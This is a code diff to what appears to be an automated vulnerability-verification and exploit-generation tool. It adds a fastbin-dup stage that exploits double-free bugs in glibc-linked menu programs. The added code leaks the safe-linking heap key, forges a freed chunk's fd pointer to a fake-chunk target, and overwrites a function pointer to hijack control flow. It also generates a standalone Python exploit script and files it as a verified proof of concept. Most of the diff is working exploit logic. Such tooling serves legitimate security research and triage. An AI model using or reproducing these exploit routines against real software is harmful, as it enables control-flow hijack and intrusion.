@@ -270,6 +270,18 @@ def chain_primitive_stage(ctx) -> dict:
                     return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                     blame=f"tcache-poison chunk over {hex(tgt)}", writer=trig,
                                     off=None, trig=trig, exe=exe)
+                # Fastbin dup: the double-free route that needs no UAF write (the dup hands the
+                # same chunk out twice), for an OLD-glibc target where fastbins still exist and a
+                # fake-chunk target is available -- the common air-gapped box. Gated inside on
+                # fastbins_present, so it self-skips on a modern (fastbin-free) libc.
+                from .exploit_stage import _libc_bytes_for
+                fbd = _fastbin_dup_chain(ctx, exe, target_bytes, win, opts, model, width, workdir,
+                                         glibc=_glibc, libc_data=_libc_bytes_for(ctx, target) or b"")
+                if fbd:
+                    roles, trig, tgt, size, key = fbd
+                    return _file_fastbin_dup_l3(ctx, target, lead, vclass, win_name, win_addr,
+                                                roles, trig, tgt, size, max(size - 8, 1), key,
+                                                _glibc is None or tuple(_glibc) >= (2, 32))
             else:
                 # CWE-129/787 indexed write -> write-what-where on a GOT slot / fn-pointer. The
                 # index selects the address, so the target can be the whole GOT, not just a byte
@@ -576,6 +588,160 @@ def _heap_leak_chain(ctx, exe, win, opts, model, width, workdir, *, glibc=None):
                 ctx.progress(msg=(f"safe-linked tcache poison: leak {roles['view']} -> heap key, "
                                   f"fd := key^{tgt:#x}, chunk over {tgt:#x} := &{win_name} -> ran"))
                 return roles, trig, tgt, key
+    return None
+
+
+# --------------------------------------------------------------------- fastbin dup (double-free)
+_TCACHE_COUNT = 7                                        # glibc default per-bin tcache capacity
+
+
+def _fastbin_fake_targets(exe, target_bytes):
+    """16-aligned writable fn-pointer slots whose PRECEDING word is a valid fastbin size -- the
+    "fake chunk" a fastbin dup must land a chunk on. Unlike tcache, the fastbin malloc path checks
+    `fastbin_index(chunksize(victim)) == idx`, so the target's chunk header (the 8 bytes at
+    target-0x8, read here from the ELF image) has to look like a fastbin-size chunk or malloc
+    aborts "memory corruption (fast)". Returns [(target, chunk_size)], best (smallest size) first;
+    this precondition is exactly why fastbin dup is narrower than the tcache poison."""
+    from . import elfstatic
+    from .heap import is_fastbin
+    out = []
+    for t in _writable_globals(exe):                     # already 16-aligned, code-referenced
+        off = elfstatic.vaddr_to_offset(target_bytes, t - 8)
+        if off is None or off + 8 > len(target_bytes):
+            continue
+        size = int.from_bytes(target_bytes[off:off + 8], "little") & ~0x0F
+        if is_fastbin(size):
+            out.append((t, size))
+    out.sort(key=lambda ts: ts[1])
+    return out
+
+
+def _fastbin_dup_run(spawn, width, roles, trig, target, req, win_addr, model, *, safe, corrupt):
+    """One in-process fastbin-dup run against a DOUBLE-FREE, ASLR-robust (leak + dup + write in one
+    process). Fill the tcache so frees reach the fastbin, free a/b/a (the fasttop check only blocks
+    an immediate repeat, so a/b/a is allowed), drain the tcache, then reallocate the dup'd chunk
+    and -- editing it as a LIVE chunk -- forge its fd to the fake-chunk target so a later malloc
+    lands there; write win over the code pointer and trigger. The heap key comes from a lone freed
+    chunk's safe-linked fd (a UAF view), so no address is baked in. `corrupt` forges a wrong fd for
+    the negative control. Returns (key, trigger_output); key None when nothing recoverable.
+
+    Allocation indices follow glibc's post-fastbin tcache STASHING (measured on glibc 2.41): after
+    the tcache drain, d1 = alloc #(upfront+count) reclaims the fastbin head, and the forged chunk
+    is handed out three allocations later."""
+    from ..fuzz import menu
+    from . import heap_groom
+    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
+    proc = spawn()
+    try:
+        _pie_drain(proc)
+
+        def send(b):
+            proc.stdin.write(b)
+            proc.stdin.flush()
+
+        def alloc():
+            send(menu._scalar(add.encode(), width)
+                 + menu._fill(model.get(add, []), num=str(req).encode(), width=width))
+            _pie_drain(proc)
+
+        def free_i(i):
+            send(menu._scalar(free.encode(), width) + menu._scalar(str(i).encode(), width))
+            _pie_drain(proc)
+
+        def view_i(i):
+            send(menu._scalar(view.encode(), width) + menu._scalar(str(i).encode(), width))
+            return _pie_drain(proc)[0]
+
+        def edit_i(i, payload):
+            out = menu._scalar(edit.encode(), width) + menu._scalar(str(i).encode(), width)
+            if "num" in model.get(edit, []):
+                out += menu._scalar(str(len(payload)).encode(), width)
+            send(out + menu._data(payload, width, term=False))
+            _pie_drain(proc)
+
+        n_up = _TCACHE_COUNT + 2                          # L + (count-1) fillers + a + b
+        for _ in range(n_up):                             # 0 = L (leak), 1..(count-1) fillers, then a, b
+            alloc()
+        a_idx, b_idx = n_up - 2, n_up - 1
+        free_i(0)                                         # L -> tcache: A.fd == A>>12
+        leak = view_i(0)                                  # UAF view of the lone tcache chunk -> key
+        cands = [int.from_bytes(leak[i:i + 8], "little") for i in range(0, max(0, len(leak) - 7))]
+        key = next((v for v in cands if heap_groom.is_plausible_heap_key(v)), None)
+        if key is None:
+            return None, b""
+        for i in range(1, _TCACHE_COUNT):                 # fill the tcache to its cap (L + these)
+            free_i(i)
+        free_i(a_idx)                                     # a -> fastbin (tcache full)
+        free_i(b_idx)                                     # b -> fastbin
+        free_i(a_idx)                                     # a again: fastbin dup (a, b, a)
+        for _ in range(_TCACHE_COUNT):                    # drain the tcache
+            alloc()
+        d1 = n_up + _TCACHE_COUNT                          # reclaims the fastbin head (== a)
+        alloc()                                           # d1
+        mangled = heap_groom.forge_safelink_fd(key, target) if safe else target
+        if corrupt:
+            mangled ^= 0xDEAD0000
+        edit_i(d1, _p64(mangled))                          # edit the LIVE dup'd chunk's fd
+        alloc(); alloc()                                  # consume the stashed duplicates
+        t_idx = d1 + 3
+        alloc()                                           # lands ON target
+        edit_i(t_idx, _p64(win_addr))                      # write win over the fake chunk's pointer
+        _pie_drain(proc)
+        tout = b""
+        if trig is not None:
+            send(menu._scalar(trig.encode(), width) + menu._scalar(str(t_idx).encode(), width))
+            tout = _pie_drain(proc)[0]
+        return key, (tout if isinstance(tout, bytes) else tout.encode("latin1"))
+    except (BrokenPipeError, OSError):
+        return None, b""
+    finally:
+        from ..dynamic import sandbox as _sb
+        _sb.kill_quietly(proc)
+
+
+def _fastbin_dup_chain(ctx, exe, target_bytes, win, opts, model, width, workdir, *,
+                       glibc=None, libc_data=b""):
+    """Double-free (CWE-415) -> control hijack via a leak-consuming safe-linked FASTBIN DUP. The
+    complement to the tcache poison: that one needs a use-after-free WRITE to plant the fd; this
+    one needs only a DOUBLE-FREE plus a normal edit of a live chunk (the dup hands the same chunk
+    out twice). Gated on fastbins still existing (gone ~glibc 2.43) and on a fake-chunk target with
+    a valid size field; marker-confirmed with a negative control, in one process (heap-ASLR defeat).
+    Returns (roles, trig, target, size, key) or None."""
+    from ..dynamic import heap_discover
+    from .heap import fastbins_present
+    fb = fastbins_present(libc_data) if libc_data else {"present": None}
+    if fb.get("present") is False:                        # no fastbin to dup into -> not applicable
+        return None
+    roles = heap_discover.identify_heap_ops(workdir, exe, model, opts, width)
+    if not roles or not roles.get("edit"):
+        return None
+    targets = _fastbin_fake_targets(exe, target_bytes)
+    if not targets:
+        return None
+    win_name, win_addr = win
+    safe = glibc is None or (isinstance(glibc, tuple) and tuple(glibc) >= (2, 32))
+    spawn = _pie_spawn(workdir, exe)
+    attempts = 0
+    for tgt, size in targets:
+        req = max(size - 8, 1)
+        for trig in list(opts) + [None]:
+            if ctx.should_cancel() or attempts >= 150:
+                return None
+            attempts += 1
+            key, pos = _fastbin_dup_run(spawn, width, roles, trig, tgt, req, win_addr, model,
+                                        safe=safe, corrupt=False)
+            if key is None:
+                continue
+            pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
+            if not any(_WIN_OUT.search(ln) for ln in pos_lines):
+                continue
+            _, neg = _fastbin_dup_run(spawn, width, roles, trig, tgt, req, win_addr, model,
+                                      safe=safe, corrupt=True)
+            neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
+            if [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]:
+                ctx.progress(msg=(f"fastbin dup: double-free a/b/a, fd := key^{tgt:#x} over the "
+                                  f"fake chunk at {tgt:#x} (size {size:#x}) := &{win_name} -> ran"))
+                return roles, trig, tgt, size, key
     return None
 
 
@@ -1377,6 +1543,120 @@ def _file_heap_leak_l3(ctx, target, lead, vclass, win_name, win_addr, roles, tri
     ctx.progress(pct=100, msg=f"L3 CONFIRMED (heap): safe-linked tcache poison -> {win_name}")
     return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
             "metrics": {"chained": True, "level": "L3", "vclass": vclass, "heap_leak": True}}
+
+
+def _fastbin_dup_repro_script(win_addr, roles, trig, target, req, safe) -> bytes:
+    """A stdlib-only reproducer for the leak-consuming fastbin dup: fill the tcache so frees reach
+    the fastbin, double-free a/b/a, drain the tcache, reallocate the dup and forge its fd to the
+    fake-chunk target, land a chunk there, write win, trigger. Carries no baked address -- the key
+    is recovered live, so it survives heap ASLR. The allocation indices match glibc's post-fastbin
+    tcache stashing (measured on glibc 2.41)."""
+    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
+    cnt = _TCACHE_COUNT
+    n_up = cnt + 2
+    a_idx, b_idx = n_up - 2, n_up - 1
+    d1 = n_up + cnt
+    t_idx = d1 + 3
+    editnum = "num" in (roles.get("edit_fields") or [])
+    tg = "" if trig is None else f"send({trig!r}+'\\n'); send(str({t_idx})+'\\n')\n"
+    return (
+        "#!/usr/bin/env python3\n"
+        "# Fastbin-dup reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
+        "import subprocess, select, os, re, struct, sys, time\n"
+        f"WIN={win_addr:#x}; TARGET={target:#x}; REQ={req}; SAFE={bool(safe)}; "
+        f"EDITNUM={bool(editnum)}; CNT={cnt}\n"
+        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
+        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
+        "def drain(t=0.3):\n"
+        "  b=b''; end=time.time()+t\n"
+        "  while time.time()<end:\n"
+        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
+        "    if r:\n"
+        "      c=os.read(p.stdout.fileno(),4096)\n"
+        "      if not c: break\n"
+        "      b+=c\n"
+        "    elif p.poll() is not None: break\n"
+        "  return b\n"
+        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
+        f"def alloc(): send({add!r}+'\\n'); send(str(REQ)+'\\n'); drain()\n"
+        f"def free(i): send({free!r}+'\\n'); send(str(i)+'\\n'); drain()\n"
+        "def edit(i,payload):\n"
+        f"  send({edit!r}+'\\n'); send(str(i)+'\\n')\n"
+        "  if EDITNUM: send(str(len(payload))+'\\n')\n"
+        "  send(payload); drain()\n"
+        "drain()\n"
+        f"for _ in range({n_up}): alloc()\n"                           # L + fillers + a + b
+        "free(0)\n"                                                    # L -> tcache
+        f"send({view!r}+'\\n'); out=send('0\\n') or drain()\n"         # UAF view -> key
+        "cands=[int.from_bytes(out[i:i+8],'little') for i in range(0,max(0,len(out)-7))]\n"
+        "key=next((v for v in cands if 0x100<=v<(1<<36)), None)\n"
+        "assert key is not None, 'no heap key disclosed'\n"
+        "for i in range(1,CNT): free(i)\n"                             # fill tcache to cap
+        f"free({a_idx}); free({b_idx}); free({a_idx})\n"               # fastbin dup a/b/a
+        "for _ in range(CNT): alloc()\n"                               # drain tcache
+        "alloc()\n"                                                    # d1 -- reclaims the dup head
+        "fd=(key^TARGET) if SAFE else TARGET\n"
+        f"edit({d1}, struct.pack('<Q',fd))\n"                          # forge the live dup's fd
+        "alloc(); alloc()\n"                                           # consume stashed duplicates
+        "alloc()\n"                                                    # lands ON target
+        f"edit({t_idx}, struct.pack('<Q',WIN))\n"                      # win over the fake pointer
+        f"{tg}"
+        "sys.stdout.write(drain().decode('latin-1','ignore'))\n"
+    ).encode()
+
+
+def _file_fastbin_dup_l3(ctx, target, lead, vclass, win_name, win_addr, roles, trig, tgt, size,
+                         req, key, safe):
+    """File a confirmed leak-consuming fastbin dup as an L3 verified PoC (bundle = target + a
+    runnable fastbin-dup reproducer; no static input can carry a runtime-leaked key)."""
+    import json as _json
+
+    from ...db.dao import FindingDAO, PocDAO
+    from . import bundle
+    script = _fastbin_dup_repro_script(win_addr, roles, trig, tgt, req, safe)
+    input_sha = ctx.put_artifact("fastbin-dup-repro", data=script)
+    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
+            "exploit": f"{vclass}->control-flow (fastbin dup, leak-relocated)", "target": win_name,
+            "win_addr": hex(win_addr), "fnptr_target": hex(tgt), "fake_chunk_size": hex(size),
+            "leak_option": roles["view"], "tool_version": TOOL_VERSION}
+    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
+                        "stdin", [], None,
+                        primitive={"type": vclass, "target": win_name, "fnptr_target": hex(tgt),
+                                   "confirmed": True, "note": "fastbin dup, leak-relocated"})
+    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
+    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
+                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
+    trg = "normal use" if trig is None else f"menu option {trig}"
+    eff = (f"working heap exploit ({vclass} -> control-flow hijack via a safe-linked FASTBIN DUP): "
+           f"filled the tcache so frees reached the fastbin, double-freed a/b/a (the fasttop check "
+           f"allows the non-adjacent repeat), recovered the heap key from option {roles['view']}'s "
+           f"use-after-free view, reclaimed the dup'd chunk and forged its fd to key^{tgt:#x} so a "
+           f"later allocation landed on the fake chunk at {tgt:#x} (size {size:#x}, a valid fastbin "
+           f"header), option {roles['edit']} wrote &{win_name} there, and {trg} called it. Shown in "
+           f"ONE process (a real heap-ASLR defeat) and confirmed by the win's output under a passing "
+           f"negative control (a corrupted fd does not win).")
+    fd = FindingDAO(ctx.conn)
+    cand = {"cwe": lead.cwe,
+            "title": "Control-flow hijack (demonstrated): L3 fastbin dup (leak-relocated)",
+            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
+            "confidence": 0.99, "authoritative": True, "title_only": True,
+            "dedup_key": f"chain:{vclass}:fastbin-dup:{target.id}", "site_detail": win_name,
+            "evidence": [{"channel": "effects", "detail": _json.dumps([{
+                "kind": "rce", "title": "Control-flow hijack (fastbin dup, ASLR defeated)",
+                "status": "demonstrated", "detail": eff,
+                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
+                          "note": eff}}])}]}
+    fd.upsert(target.id, target.case_id, cand)
+    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
+    if fid:
+        PocDAO(ctx.conn).set_finding(poc_id, fid)
+    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
+    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
+             "win": win_name, "technique": "fastbin-dup", "fnptr_target": hex(tgt),
+             "trigger": trig, "bundle": bundle_sha})
+    ctx.progress(pct=100, msg=f"L3 CONFIRMED (heap): fastbin dup -> {win_name}")
+    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
+            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "fastbin_dup": True}}
 
 
 def _stage_and_crawl(ctx, target, *, exe_dir=None):
